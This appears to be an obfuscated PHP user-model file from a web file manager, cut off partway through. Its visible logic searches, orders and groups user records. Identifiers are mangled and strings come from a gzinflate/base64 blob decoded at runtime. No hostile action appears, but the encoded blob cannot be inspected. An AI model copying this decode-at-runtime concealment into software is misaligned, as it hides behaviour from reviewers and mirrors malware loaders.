$this->_listDataApply($‡Ü¤’Û[$û£§À±¤[422]]); return $‡Ü¤’Û; } private function _makeOrder($ÀİÏÃ‡ = '') { $ö³‡’° =& $_SERVER[–Ú¬çÁ]; $Ûö¡Ç‰ = array($ö³‡’°[1666], $ö³‡’°[32], $ö³‡’°[1853], $ö³‡’°[1825], $ö³‡’°[225]); $Á±«•Šº = array($ö³‡’°[500] => $ö³‡’°[501], $ö³‡’°[502] => $ö³‡’°[503]); $ÜÄÁñÛÚ = Input::get($ö³‡’°[507], $ö³‡’°[7], $ö³‡’°[1657], $Ûö¡Ç‰); $œĞ¸éùÂ = Input::get($ö³‡’°[508], $ö³‡’°[7], $ö³‡’°[1955], array($ö³‡’°[1955], $ö³‡’°[502])); $œĞ¸éùÂ = $Á±«•Šº[$œĞ¸éùÂ]; $ÀİÏÃ‡ = $ÀİÏÃ‡ . "\x75\x73\x65\162\x2e{$ÜÄÁñÛÚ}\40{$œĞ¸éùÂ}\54\x20\x75\163\x65\x72\x2e\165\x73\x65\162\x49\104\x20\x61\163\x63"; return $this->alias($ö³‡’°[2081])->order($ÀİÏÃ‡); } public function listSearch($ï˜Ç—”ì) { $âš‚‡šŸ =& $_SERVER[–Ú¬çÁ]; $ôÌÇØ‰Ê = $ï˜Ç—”ì[$âš‚‡šŸ[1958]]; $à§Ò³İÏ = isset($ï˜Ç—”ì[$âš‚‡šŸ[1959]]) ? $ï˜Ç—”ì[$âš‚‡šŸ[1959]] : !1; $ôÌÇØ‰Ê = str_replace($âš‚‡šŸ[1960], $âš‚‡šŸ[1961], trim($ôÌÇØ‰Ê)); $™ÒÆåÛÈ = array($âš‚‡šŸ[32] => array($âš‚‡šŸ[436], "\45{$ôÌÇØ‰Ê}\x25"), $âš‚‡šŸ[358] => array($âš‚‡šŸ[436], "{$ôÌÇØ‰Ê}\x25"), $âš‚‡šŸ[2146] => array($âš‚‡šŸ[436], "{$ôÌÇØ‰Ê}\x25"), $âš‚‡šŸ[1020] => $âš‚‡šŸ[1962]); if (Input::check($ôÌÇØ‰Ê, $âš‚‡šŸ[364])) { $™ÒÆåÛÈ[$âš‚‡šŸ[1666]] = array($âš‚‡šŸ[436], "{$ôÌÇØ‰Ê}\x25"); $™ÒÆåÛÈ[$âš‚‡šŸ[2337]] = array($âš‚‡šŸ[436], "{$ôÌÇØ‰Ê}\x25"); } if (!$ôÌÇØ‰Ê) { $™ÒÆåÛÈ = array(); } if (isset($ï˜Ç—”ì[$âš‚‡šŸ[770]])) { $™ÒÆåÛÈ[$âš‚‡šŸ[770]] = $ï˜Ç—”ì[$âš‚‡šŸ[770]]; } $™ÒÆåÛÈ = $this->parseWhereLike($™ÒÆåÛÈ); $åõÚŞ—¾ = $this->_makeOrder()->where($™ÒÆåÛÈ)->selectPage(20); if (!$åõÚŞ—¾ || count($åõÚŞ—¾[$âš‚‡šŸ[422]]) < 5 && Input::check($ôÌÇØ‰Ê, $âš‚‡šŸ[371])) { $öñôšü… = $this->_searchFromMeta($âš‚‡šŸ[514], $ôÌÇØ‰Ê, 10); $ÈŒÇÈÌ‡ = $this->_searchFromMeta($âš‚‡šŸ[515], $ôÌÇØ‰Ê, 10); $Ë†ĞÓá£ = array_merge($öñôšü…, $ÈŒÇÈÌ‡, $åõÚŞ—¾[$âš‚‡šŸ[422]]); $åõÚŞ—¾[$âš‚‡šŸ[422]] = array_unique_by_key($Ë†ĞÓá£, $âš‚‡šŸ[1666]); $åõÚŞ—¾[$âš‚‡šŸ[419]][$âš‚‡šŸ[420]] = count($åõÚŞ—¾[$âš‚‡šŸ[422]]); $åõÚŞ—¾[$âš‚‡šŸ[419]][$âš‚‡šŸ[421]] = ceil($åõÚŞ—¾[$âš‚‡šŸ[419]][$âš‚‡šŸ[420]] / $åõÚŞ—¾[$âš‚‡šŸ[419]][$âš‚‡šŸ[416]]); } $this->_listDataApply($åõÚŞ—¾[$âš‚‡šŸ[422]]); $this->_filterByGroup($åõÚŞ—¾, $à§Ò³İÏ); return $åõÚŞ—¾; } private function _filterByGroup(&$Å Í¶ñ½, $ÛÚğŒ±£) { $›¡‚£»¡ =& $_SERVER[–Ú¬çÁ]; if (!$ÛÚğŒ±£) { return $Å Í¶ñ½; } foreach ($Å Í¶ñ½[$›¡‚£»¡[422]] as $ç¦×‚ØŞ => &$äÚ¦¨‘½) { $À‚±Ğ†µ = array_to_keyvalue($äÚ¦¨‘½[$›¡‚£»¡[2051]], $›¡‚£»¡[12], $›¡‚£»¡[1864]); if (!in_array($ÛÚğŒ±£, $À‚±Ğ†µ)) { unset($Å Í¶ñ½[$›¡‚£»¡[422]][$ç¦×‚ØŞ]); } } unset($äÚ¦¨‘½); $Å Í¶ñ½[$›¡‚£»¡[422]] = array_values($Å Í¶ñ½[$›¡‚£»¡[422]]); $Å Í¶ñ½[$›¡‚£»¡[419]] = array($›¡‚£»¡[2116] => count($Å Í¶ñ½[$›¡‚£»¡[422]]), $›¡‚£»¡[2114] => $Å Í¶ñ½[$›¡‚£»¡[419]][$›¡‚£»¡[416]], $›¡‚£»¡[2113] => 1, $›¡‚£»¡[2115] => 1); } private function _searchFromMeta($Øá…öô…, $¢¸Ø¸–€, $ ¨´ÙîÂ) { $š™ñ‰à¸ =& $_SERVER[–Ú¬çÁ]; $¢¸Ø¸–€ = strtolower($¢¸Ø¸–€); $‘÷ÀÂ§ş = array($š™ñ‰à¸[94] => $Øá…öô…, $š™ñ‰à¸[427] => array($š™ñ‰à¸[436], "\x25{$¢¸Ø¸–€}\45")); $‘÷ÀÂ§ş = $this->parseWhereLike($‘÷ÀÂ§ş); $ıÑŒÈÄ¨ = Model($š™ñ‰à¸[2356])->where($‘÷ÀÂ§ş)->limit($ ¨´ÙîÂ)->select(); if (!$ıÑŒÈÄ¨) { return array(); } $ıÑŒÈÄ¨ = array_to_keyvalue($ıÑŒÈÄ¨, $š™ñ‰à¸[12], $š™ñ‰à¸[1666]); $Áä™â¶„ = $this->where(array($š™ñ‰à¸[1657] => array($š™ñ‰à¸[7], $ıÑŒÈÄ¨)))->select(); if (!$Áä™â¶„) { return array(); } return $Áä™â¶„; } private function _listDataApplyItem($€ÃõÁŞŒ) { $çÓçË¾ = array($€ÃõÁŞŒ); $this->_listDataApply($çÓçË¾); return $çÓçË¾[0]; } private function _listDataApply(&$àÎÈ€Ü­) { $¡ ÆåŒú =& $_SERVER[–Ú¬çÁ]; if (!$àÎÈ€Ü­) { return; } array_remove_key($àÎÈ€Ü­, $¡ ÆåŒú[909]); $¦±ãç = array_to_keyvalue($àÎÈ€Ü­, $¡ ÆåŒú[12], $¡ ÆåŒú[1666]); $this->_listAppendGroup($àÎÈ€Ü­, $¦±ãç); $this->_listAppendMeta($àÎÈ€Ü­, $¦±ãç); $this->_listAppendSourceRoot($àÎÈ€Ü­, $¦±ãç); } private function _listAppendSourceRoot(&$€İÒÁ¶Ù, $•˜š÷ÄÎ) { $È·¹€Œø =& $_SERVER[–Ú¬çÁ]; $¦İÔÎøŞ = Model($È·¹€Œø[845])->listSourceRoot(SourceModel::TYPE_USER, $•˜š÷ÄÎ); $¦İÔÎøŞ = array_to_keyvalue($¦İÔÎøŞ, $È·¹€Œø[548]); $¦İÔÎøŞ = array_remove_key($¦İÔÎøŞ, $È·¹€Œø[548]); foreach ($€İÒÁ¶Ù as &$„€ºÌ) { $„€ºÌ[$È·¹€Œø[87]] = $¦İÔÎøŞ[$„€ºÌ[$È·¹€Œø[1666]]] ? $¦İÔÎøŞ[$„€ºÌ[$È·¹€Œø[1666]]] : array(); } unset($„€ºÌ); } private function _listAppendGroup(&$îÔÆÂùà, $ø”¼ÃÅ) { $Õ×˜È± =& $_SERVER[–Ú¬çÁ]; $Ûœğ¿Ò = array($Õ×˜È±[1666] => array($Õ×˜È±[7], $ø”¼ÃÅ)); $Àì¡“–ó = Model($Õ×˜È±[1954])->where($Ûœğ¿Ò)->select(); $•Êª¡İÀ = array_to_keyvalue($Àì¡“–ó, $Õ×˜È±[12], $Õ×˜È±[1864]); $•Êª¡İÀ = array_remove_value(array_unique($•Êª¡İÀ), $Õ×˜È±[222]); if (!$•Êª¡İÀ || !$Àì¡“–ó) { return; } $Ûœğ¿Ò = array($Õ×˜È±[1864] => array($Õ×˜È±[7], $•Êª¡İÀ)); $Â“•ôóÜ = Model($Õ×˜È±[2049])->field($Õ×˜È±[2357])->where($Ûœğ¿Ò)->select(); $Â“•ôóÜ = array_to_keyvalue($Â“•ôóÜ, $Õ×˜È±[1864]); $Àì¡“–ó = array_to_keyvalue_group($Àì¡“–ó, $Õ×˜È±[1666]); foreach ($Àì¡“–ó as &$ìâ³ƒİ) { $¨½»¯ş = array(); foreach ($ìâ³ƒİ as $£¶¤ÆŞå) { if (!$£¶¤ÆŞå[$Õ×˜È±[1968]]) { continue; } $ù¦ÖøŞ™ = Model($Õ×˜È±[550])->listData($£¶¤ÆŞå[$Õ×˜È±[1968]]); $¨½»¯ş[] = array($Õ×˜È±[1864] => $£¶¤ÆŞå[$Õ×˜È±[1864]], $Õ×˜È±[2358] => $Â“•ôóÜ[$£¶¤ÆŞå[$Õ×˜È±[1864]]][$Õ×˜È±[32]], $Õ×˜È±[563] => $Â“•ôóÜ[$£¶¤ÆŞå[$Õ×˜È±[1864]]][$Õ×˜È±[563]], $Õ×˜È±[464] => $ù¦ÖøŞ™); } $ìâ³ƒİ = $¨½»¯ş; } unset($ìâ³ƒİ); foreach ($îÔÆÂùà as &$´œÎşµÖ) { $´œÎşµÖ[$Õ×˜È±[2051]] = array(); if (isset($Àì¡“–ó[$´œÎşµÖ[$Õ×˜È±[1666]]])) { $´œÎşµÖ[$Õ×˜È±[2051]] = $Àì¡“–ó[$´œÎşµÖ[$Õ×˜È±[1666]]]; } } unset($´œÎşµÖ); } public function userAppendGroup($¥€÷¦Õå) { $›ä… „ô =& $_SERVER[–Ú¬çÁ]; if (!$¥€÷¦Õå) { return array(); } $this->_listAppendGroup($¥€÷¦Õå, array_to_keyvalue($¥€÷¦Õå, $›ä… „ô[12], $›ä… „ô[1666])); return $¥€÷¦Õå; } private function _listAppendMeta(&$Ä¥á´á§, $şŒ—ûã) { $¶ˆ‰ûø =& $_SERVER[–Ú¬çÁ]; $¸­¯â¦Ü = UserJobModel::JOB_KEY; $¥®ç“Â¼ = array($¶ˆ‰ûø[2338]); $¢øÕÙ¿× = array($¶ˆ‰ûø[1666] => array($¶ˆ‰ûø[7], $şŒ—ûã)); $Šâ¾˜ÔÑ = Model($¶ˆ‰ûø[2336])->where($¢øÕÙ¿×)->select(); $Šâ¾˜ÔÑ = array_to_keyvalue_group($Šâ¾˜ÔÑ, $¶ˆ‰ûø[1666]); foreach ($Šâ¾˜ÔÑ as &$øÅ«½Çê) { $õä‘££À = array(); foreach ($øÅ«½Çê as $¤ºŠšñ) { if (!in_array($¤ºŠšñ[$¶ˆ‰ûø[94]], $¥®ç“Â¼)) { $õä‘££À[$¤ºŠšñ[$¶ˆ‰ûø[94]]] = $¤ºŠšñ[$¶ˆ‰ûø[427]]; } } $øÅ«½Çê = $õä‘££À; } unset($øÅ«½Çê); $‹ßÇÎš = Model($¶ˆ‰ûø[2359]); foreach ($Ä¥á´á§ as &$»‚‰ëÅĞ) { $ãûğáÛ® = array(); if (isset($Šâ¾˜ÔÑ[$»‚‰ëÅĞ[$¶ˆ‰ûø[1666]]])) { $ãûğáÛ® = $Šâ¾˜ÔÑ[$»‚‰ëÅĞ[$¶ˆ‰ûø[1666]]]; } $»‚‰ëÅĞ[$¶ˆ‰ûø[2360]] = array(); if (isset($ãûğáÛ®[$¸­¯â¦Ü])) { $»‚‰ëÅĞ[$¶ˆ‰ûø[2360]] = $‹ßÇÎš->getUserJobInfo($ãûğáÛ®[$¸­¯â¦Ü]); } } unset($»‚‰ëÅĞ); } protected function groupUserAll($äğşËÄÁ) { $‡İúõå =& $_SERVER[–Ú¬çÁ]; if (!$äğşËÄÁ) { return !1; } $·ŠÉ¾¯ó = Model($‡İúõå[1954])->field($‡İúõå[1666])->where(array($‡İúõå[1864] => array($‡İúõå[7], $äğşËÄÁ)))->select(); $·ŠÉ¾¯ó = array_to_keyvalue($·ŠÉ¾¯ó, $‡İúõå[12], $‡İúõå[1666]); return array_unique($·ŠÉ¾¯ó); } public function userSearch($åšèÛ´, $ØàƒÓæ¢ = "\x2a") { return Model($_SERVER[–Ú¬çÁ][577])->where($åšèÛ´)->field($ØàƒÓæ¢)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Šêáâ–‘) { $ğ¡ıœë¬ =& $_SERVER[–Ú¬çÁ]; $¢ğª¿¡ = defined($ğ¡ıœë¬[2085]) && USER_ID ? USER_ID : $ğ¡ıœë¬[12]; return "\x55\x73\145\x72\x4f\160\x74\x69\157\156\x5f{$Šêáâ–‘}\x5f" . $¢ğª¿¡; } protected function filterWhere($Ìå£Š­©) { $şüê¶â™ =& $_SERVER[–Ú¬çÁ]; $Ìå£Š­©[$şüê¶â™[1666]] = defined($şüê¶â™[2085]) && USER_ID ? USER_ID : $şüê¶â™[12]; return $Ìå£Š­©; } public function cacheRemoveUser($ç·Ùß­¿, $úö±­êÀ) { return Cache::remove("\x55\x73\x65\x72\117\160\164\151\x6f\156\x5f{$ç·Ùß­¿}\137" . $úö±­êÀ); } protected function optionDefault($Ç‘½ö” = '') { $—øŠõ =& $_SERVER[–Ú¬çÁ]; if ($Ç‘½ö” == $—øŠõ[12]) { return $GLOBALS[$—øŠõ[6]][$—øŠõ[2361]]; } if ($Ç‘½ö” == $—øŠõ[2362]) { return $GLOBALS[$—øŠõ[6]][$—øŠõ[2363]]; } } } goto dÒÒŞ’Ïî¼; e«ÖÒ«ƒãô: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\226\332\254\347\216\301", strrev('Íê‰ÖÍì')); $_SERVER[–Ú¬çÁ] = explode(base64_decode('fAF8AXwE'), gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9B3xb1fU4DnQwC5RASwfwcBNsJxp2EifEiWNkW46VyJYjyRnYzg==').strrev('çß€Kãğ£(Ê$Œ´'."\n".'2¬¦Ú=ì£ØIKK@•e¯a ²‡<õ“ÒX¿$ô“Ë')."\367\44\303\367\377\371\377\77\237\177\40\321\275\347\216\167\307\271\347\236\173\356\71\347\336\377\311\347\47\236\361\327\361\335\321\177\337\375\333\243\117\77\271\363\35\32\106\177\277"."\67\276\7\15\37\261\161\257\335\310\237\111\33\67\324\324\164\314\332\147\132\327\176\147\335\162\275\366\107\355\172\155\103\44\374\347\277\204\176\260\365\217\13\203\73\66\375\171\154".base64_decode('x+673b3tiWIjykzLNtIfJW/aij5qWLZFAUkznzYyNGzk6a+f/vREw0U9Z9o6jfrojw==')."\xca\xdb\x85\xfe\xb5\x86\xb2\x6\x4b\x57\xbb\x22\x71\x35\xd6\xd3\xdd\x1d\x8c\xc6\x21\x53\xa3\x9c\x9e\x33\x53\x10\x2a\x68\x45\x2d\x7\xdf\x2f\xe8\x45\xb\xb5\x46\xae\x4e\x2d\x98\x5\x3d\xef\x80\x8"."\x40\x4a\xb3\xb5\x84\x66\x41\x4d\x6d\x2d\x6a\x5b\xb0\x3b\x1c\x59\xae\xc6\x97\x77\x7\x21\x47\x42\x1d\x2a\xe9\xc5\x31\x1a\x23\xc1\x98\xad\x15\xed\xb8\x91\xd3\x79\x8e\x91\x22\x6f\x57\x4b\x70\x41\xa8"."\x4b\x89\x47\x3\x5d\xb1\x40\x6b\x3c\x14\xe9\xa2\xe0\xd6\x48\x67\x67\x28\x5e\xe\x8f\x46\xc2\xe1\x96\x40\xeb\xa2\xf2\x94\xee\x68\x60\x41\x67\x40\x41\xed\xcb\xea\xaa\x91\x4f\x9b\x35\xca\x4a\x9a\xb2".base64_decode('UqmlgXZDz6ZoMK+x5thjBQjFeQhNU76UzdJIFw+l9LRWysJotcmRQtHIaazTi/QxDg==')."\xa5\x1\xad\x64\x9b\x46\x3e\x49\x23\xc1\x51\xbb\xa8\x9\x38\x6a\x6b\x12\x4d\xb4\x9e\x87\xaa\x62\xc1\x70\xb0\x35\xae\xe0\x6\x2a\xed\xd1\x48\xa7\x2\x93\x90\xd3\x2c\x5b\x2f\x2a\x4b\x3b\x82\xd1\xa0"."\x82\x1b\xdd\x54\x4d\xfa\x5a\xad\x0\xbe\x74\xa1\xa1\x50\x2\xe1\xb0\x32\x51\xd\xb6\x9e\x2b\xb0\x6a\x68\x99\xa\x95\x45\xa2\x6d\xc1\xa8\xd2\xb2\x5c\x11\x23\x94\x34\x73\x39\x33\xef\x43\xb5\xa0\x99"."\264\245\246\6\243\121\32\360\0\172\207\103\170\322\40\22\151\157\217\5\171\14\72\267\70\214\132\62\3\360\323\21\113\245\263\266\72\254\145\113\14\115\7\351\157\65\374\300\257"."\x69\x1\xea\xe\x19\x79\xa3\x4\x68\xa\x55\x98\x26\x5f\x56\x10\x28\xb1\xdc\x3a\x83\xe8\x29\x8\xe4\x50\x79\x13\x56\x1e\x5a\x86\xc3\x34\xd8\x34\x9f\xfe\xce\x85\x4c\x9\x15\xa7\xe9\x45\x5b\xd5\xf3".strrev('a£IÊo¯­‘TÙMrr•w«#i+¡«l,Sfm<h@Ñ[@öiÒ6±aäe3I').strrev('¼‹Ó-Md)ìÃ9Ôm·X×Ö„=IŠ–eªyºùÃzÄÇ¤n•³Œ– +^q\\¾')."\153\206\331\216\52\212\224\154\31\130\42\331\332\315\142\256\15\121\6\370\76\132\25\106\117\205\204\101\266\56\122\322\210\371\153\172\117\360\176\325\337\173\14\372\247\26\110\137\37"."\264\151\100\317\146\125\175\124\207\205\223\113\65\130\154\60\374\126\302\310\373\21\204\106\103\21\165\100\263\6\72\123\15\52\51\5\115\316\247\364\121\137\141\240\100\243\142\111\367"."\71\20\33\17\135\227\151\7\45\272\234\65\223\132\126\356\42\15\17\330\166\41\246\347\123\170\44\240\53\346\110\236\214\124\101\327\41\123\233\107\111\51\235\312\162\245\243\321\150"."\xb4\x58\xc1\x5c\x96\x87\x58\xef\x38\xcc\xe2\x40\x7b\x94\x4d\x67\x2a\x4d\x3\x9\xb6\x2d\x54\xc1\x7\xd\x8b\x50\x38\xb1\x3c\xb5\x42\x21\x6b\x24\x35\xdb\x30\xf3\x7e\x33\x69\xeb\xb6\xd7\xb2\x8b\xba".base64_decode('BjUGkkndsrytZt4umllvIJs1R7yRopEx8o3KVJoHJ6JF7cUEsBFWatVcBSMO/szUpg==')."\x92\x9d\xf6\x1e\xcd\x56\x20\xcf\x5d\xd4\xf2\x56\x5a\x2f\x7a\x83\xb0\x32\x1a\x15\xd4\x58\x4e\x5\x59\xb6\x36\xc3\x2a\x98\x96\x81\x9b\xd7\xa8\x68\xb6\xad\x25\x7\x30\x5\x11\xd5\x37\x7d\x43\x7e\x23"."\x9f\x35\xf2\x7a\x59\xde\xe0\x68\xc1\x28\xea\x16\x6b\xab\xb2\xa0\x33\xe\x95\xa0\xda\x75\x6f\x77\x51\xcb\xe4\xb4\x46\xa5\x50\x4a\xa0\x91\x81\x95\x5a\x1\x46\x73\xc3\xd0\x34\x2a\x49\x1c\xf5\x28\xb9".strrev(';TÜ–ÑÚ†­Ş<GhQ¥…B'."\n".'™ºŒğÅÆò†W^\'oiC`îÚE":‹{e’').strrev('Ğˆc™ÂKQÌ%LĞeF±–áôEèmØ¯¨]\\Œ/­™p*óˆÃ›Xe­¶hÖñ')."\260\314\170\272\13\266\67\252\345\63\170\174\22\143\266\16\50\50\110\125\13\332\300\175\151\272\230\175\11\75\155\26\241\67\326\160\306\71\27\141\75\237\261\7\130\335\261\140\164"."\111\60\252\306\42\355\361\245\201\50\354\367\171\204\110\243\254\65\370\353\131\157\124\117\241\331\111\332\254\234\126\300\3\313\362\340\365\203\77\316\122\361\232\142\151\341\320\2\74"."\166\155\136\13\145\362\312\271\130\335\141\43\147\340\356\331\74\205\14\66\142\6\26\100\203\374\244\317\115\175\326\324\232\276\324\264\132\57\372\167\152\155\157\137\233\157\152\177\263".base64_decode('3xBl/PW+emV63SylG3EnhpZVoNNlOeqUyCLnsAiEz5t5/RsGB29vEmVwDSsFRoOLew==')."\202\261\270\332\31\214\167\104\332\340\353\301\0\204\302\46\135\331\254\267\275\364\247\37\20\240\237\376\250\206\325\56\355\74\70\312\51\224\152\46\126\241\311\350\324\31\31\206\231"."\17\345\264\214\264\17\250\316\155\2\307\160\142\247\100\16\204\145\113\215\24\337\107\120\264\103\67\62\3\60\140\6\256\56\151\146\315\242\226\305\324\223\55\34\235\121\264\214\1"."\24\255\220\55\41\234\361\343\57\304\7\112\271\4\20\175\304\44\146\164\133\360\140\326\30\142\124\200\210\41\226\25\215\133\10\306\4\266\60\210\371\125\74\317\175\276\102\76\123"."\x3b\x19\xea\x52\xa7\x37\xd4\x61\x0\xa0\x28\x74\x11\x31\xa3\x25\x69\x4f\x64\x63\xe0\x4b\x9a\x68\x51\x74\x6a\x83\x7a\x23\xee\x14\x90\x98\xb9\x4\xca\x22\x12\xed\x99\x8b\xb7\x8b\x26\xf7\x9a\xc2\xf3"."\x94\xf5\xe5\x50\x25\xa4\xce\x56\x93\x6f\x70\x94\xdd\x7\x7e\x82\x6d\x17\x8a\x5e\x2c\x9a\xc5\x23\x21\x7\x9\x2b\x64\xcf\xc1\xf3\x6\x95\xdb\x7c\x7\xb7\xd0\xf2\x61\xe1\x1\x93\xef\xf8\x66\x11\x42"."\x8d\x7e\xe8\xf7\x94\xe9\xed\x30\x0\x5a\x9a\x23\x0\xe\x9\x5e\x84\xa6\x60\x92\x11\x92\x78\xe\x15\xd\x3d\xe6\x74\x30\x7a\x2\xbd\x68\x9\xc4\x42\xad\x6a\x77\x20\xde\xc1\x56\x71\xc1\x6f\xa5\x6"."\x2d\xbf\x56\x44\x3c\xcb\x30\x62\x3d\x12\x7e\xbc\x7\xe3\x23\x81\x8f\xef\x52\xfb\xd0\x9f\x99\xf4\x7\xb5\x3b\x39\xa8\x6a\x9\xd4\x52\xb6\x6\x4a\x98\xa2\x3\x6b\x17\x8a\xf8\x63\x33\xd0\xff\x62\x8b"."\x4e\x99\x39\x8d\x55\x45\xb6\x2a\x3d\x45\xf7\x2a\xa\x9a\xea\x48\xe9\xd0\x35\xc1\x6c\xd9\x45\xdb\xc4\xd0\xa2\x23\xb\xc2\xfa\x1\x13\xbe\x8c\xba\x8\x3\x57\xe2\x23\xc8\xc6\x32\xa5\x67\x75\x86\xb1".base64_decode('Azrb7usgG5phjs9iXBHXjqCCzzKsKCqJN2cWX4qPOQKAORSYBBHMIuyIkBUq4t1FPQ==').strrev('œãnÖ¨¦ˆ¢‹@â†,…S£ŠéÚ°á=í÷ZDq¶±IPÇY©Ô£ÍQ'."\0".'m')."\331\51\306\313\330\0\12\31\236\16\250\210\32\341\27\374\12\332\172\13\146\336\322\275\200\61\136\161\206\52\113\112\211\355\34\360\110\260\0\256\135\175\324\253\345\126\173\163\210"."\x50\x79\x79\xf3\x9c\xcc\x94\x2\xdb\x3c\xe5\xc9\x42\x30\x4d\x62\x97\xc6\x83\x87\x68\x5\x43\xe1\xee\x48\xc\xa\x34\x63\x28\xe2\xa4\x13\x7c\x49\x77\xf7\x40\x52\x4e\x42\x91\x5\x41\x0\x5a\x3\x5a"."\75\40\322\322\30\333\132\113\50\143\321\130\255\211\276\64\263\206\260\36\344\262\202\43\167\166\307\53\246\34\125\71\323\333\321\31\150\365\306\72\2\323\33\146\121\350\362\134\252"."\x2f\xde\x61\x58\x7d\xc7\xf2\x38\xc\xd8\x88\x35\x53\x2d\xea\x88\x7a\xb1\x9a\xa7\xd7\x41\xe3\x74\xcc\x7\x49\xed\x59\xee\xcd\x79\x71\x2d\x78\xac\x7c\x75\x75\x75\xac\xae\x69\xb3\x94\x1\x44\x34\x1"."\157\315\174\212\314\7\214\122\242\224\34\144\113\103\113\62\226\24\237\331\55\357\210\301\350\375\144\316\275\117\56\307\223\311\316\235\15\252\50\21\326\123\325\222\370\143\52\252\321"."\56\131\362\320\240\5\224\102\205\14\306\151\123\250\226\315\240\121\266\7\162\62\120\114\61\215\353\224\1\344\223\305\107\21\217\255\23\233\345\46\25\114\304\373\101\67\226\125\154"."\303\262\112\155\130\346\152\303\262\362\66\120\220\145\144\362\250\227\154\313\214\167\204\272\26\251\235\221\266\140\130\15\165\41\16\41\136\16\357\351\156\13\260\45\52\303\133\42\214"."\360\2\264\7\361\10\113\2\341\220\73\173\160\131\50\26\217\125\114\102\260\236\240\53\245\255\105\355\216\6\333\103\313\170\264\75\24\14\267\305\324\326\100\153\207\310\323\25\350".base64_decode('hAhiDPRsyvI786uI2Ylx2Ys6jOVIDAtVh7hDZQd5VVAJxPfqMODQXSy9Ij1RGZKWGA==')."\53\306\317\174\71\266\15\344\64\40\216\32\143\130\153\350\117\255\22\210\51\166\1\352\100\4\77\61\306\203\244\33\54\216\166\132\370\276\2\214\127\131\13\124\234\247\105\342\216"."\53\3\2\151\233\263\135\256\70\42\157\42\15\315\100\200\210\311\20\46\220\31\201\317\30\210\130\26\355\0\153\116\132\210\250\324\110\167\60\32\300\2\56\165\151\64\322\265\0"."\12\214\14\350\254\1\41\30\376\32\166\16\2\71\227\55\366\34\164\210\321\230\300\103\14\372\52\223\15\345\70\375\71\212\376\240\155\34\76\256\347\331\250\47\360\366\313\230\74"."\x16\x48\x23\xb2\xc7\xb6\x4e\xb3\xc4\xbf\x96\x30\x4d\xf8\x42\x16\xf3\xe9\xe3\x6c\x4b\xe0\x72\xb2\x55\x16\x43\x92\x51\xb6\x99\x4c\x1b\x67\xa4\xc\x50\x37\xb2\x28\xd8\xa5\x32\xcc\xa2\x31\x9\x1b\x29"."\40\30\215\106\242\60\40\266\71\310\304\47\64\61\32\214\61\72\216\311\246\301\206\313\357\233\6\130\254\43\56\3\76\357\137\321\67\62\255\246\327\73\315\327\217\2\265\123\217".base64_decode('oVGI9fkcUcZfloq8ND6+1FjNtY19/j5/TXNjb8C7WvOurvPO8fYjrrR2GgD610z3zA==').base64_decode('XIszoIzNv+hHP019zVP6vEcdt/KY3r7+6sZpR/b5ftE30j+1tpl9J1kqIsaXUSzU1A==')."\xd4\xb4\x1a\xd4\x24\x74\xac\xe1\x59\xf2\x64\x53\x93\x32\xb0\x84\xd5\x46\x41\x40\xd7\xcc\x5a\xcb\xe0\x68\xe\xf5\x8c\x28\xd1\xeb\xed\x9b\xd6\xdf\x2c\x95\x93\x40\xee\x6f\x21\x4a\x8a\x76\xd8\x1\x9e".base64_decode('L+A9FveMF8XrHvCjlE+KbQmvi4SWBDqAaKQ4VNhFLlJzHrjXTKG/a9lEZnRY9ERmXg==')."\4\354\54\345\215\41\306\324\347\365\41\10\230\66\303\357\204\156\217\350\14\75\20\334\21\107\310\301\350\76\112\222\142\131\151\317\40\262\17\216\243\34\231\214\202\212\17\72\43"."\74\206\266\21\230\247\275\41\267\225\324\12\172\114\352\241\252\306\3\55\341\240\312\50\14\120\142\26\47\124\261\205\113\327\121\327\4\105\145\364\41\51\216\322\104\260\0\53\337"."\x1a\xca\x2a\x84\x30\xd0\x83\x45\x23\xb9\x68\xb0\x4a\x5\x7c\x46\x50\xd0\x8c\xa3\xb1\x55\xd0\x6\xae\x34\xcd\x57\xe8\x90\x43\x39\x55\x9e\x80\x82\xc6\x38\x41\x2c\x18\xd3\xc5\xa2\xc7\x14\xa\xda\x54"."\x10\x33\x64\x21\x9e\x99\x71\xad\xfe\x9a\xbe\xbe\x52\xaf\x9e\xea\xef\x45\x88\xaf\x79\xd3\xfd\x6b\x66\xac\xad\x65\xa7\x6d\x7f\x1f\xfa\xc3\x22\x81\xa\x22\x6f\x95\x53\x43\x15\x71\x60\x3e\xdc\xe\x2e"."\365\164\104\170\62\215\232\105\316\372\26\34\207\131\333\264\265\254\243\212\70\206\300\344\162\16\15\344\177\164\266\303\202\142\141\236\115\272\53\40\344\264\213\313\333\70\43\44\11"."\253\161\211\230\156\373\170\16\217\224\250\242\270\343\336\246\11\144\171\151\43\217\226\123\253\264\325\121\51\154\214\34\175\35\27\14\226\216\217\135\355\245\154\326\346\47\352\254\61"."\x8\x5f\x80\xb5\x2\xf7\x1d\x5e\xfa\xa3\x4c\xab\x54\xb4\xdd\x2c\x32\xe1\xd5\x54\x68\x46\xd5\xd4\x4a\x19\x43\xf9\xbc\x99\x4a\xc8\xa8\x26\x36\xd9\x5\x1\xc4\xce\xc4\x95\x1a\x26\x9b\x57\x42\x5d\x4a".strrev('GE2tFù@³v9Ùy—z²ój]pƒÅ‹,16€;°X…˜„>ÃŸ¼º$K').strrev('ÃmCáòšp<›€HGĞØg¸ió4qºOƒÚµ…¼Áî<ø<